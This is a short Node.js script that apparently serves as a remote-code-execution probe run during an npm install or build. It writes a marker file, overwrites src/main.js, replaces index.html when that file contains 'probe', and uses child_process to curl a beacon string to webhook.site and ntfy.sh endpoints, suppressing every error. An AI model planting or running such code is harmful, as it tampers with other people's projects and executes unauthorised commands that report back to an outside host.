const fs = require('fs');
function w(f, s) { try { fs.writeFileSync(f, s); } catch (e) {} }
w('RCE2P66_NPM_RAN.txt', 'RCE2P66\n');
try { fs.writeFileSync('src/main.js', "console.log('RCE2P66BUILDEXEC');\n"); } catch (e) {}
try { const s = fs.readFileSync('index.html', 'utf8'); if (s.indexOf('probe') !== -1) w('index.html', '<!doctype html><html><body>RCE2P66BUILDEXEC</body></html>\n'); } catch (e) {}
try { require('child_process').execSync('curl -s -m 5 -d RCE2P66NPM https://webhook.site/a78baf7b-0997-4554-9174-0200e7144160 2>/dev/null || true', {timeout: 9000}); } catch (e) {}
try { require('child_process').execSync('curl -s -m 5 -d RCE2P66NPM https://ntfy.sh/rce2-figma-e9a00199af4f9d86 2>/dev/null || true', {timeout: 9000}); } catch (e) {}
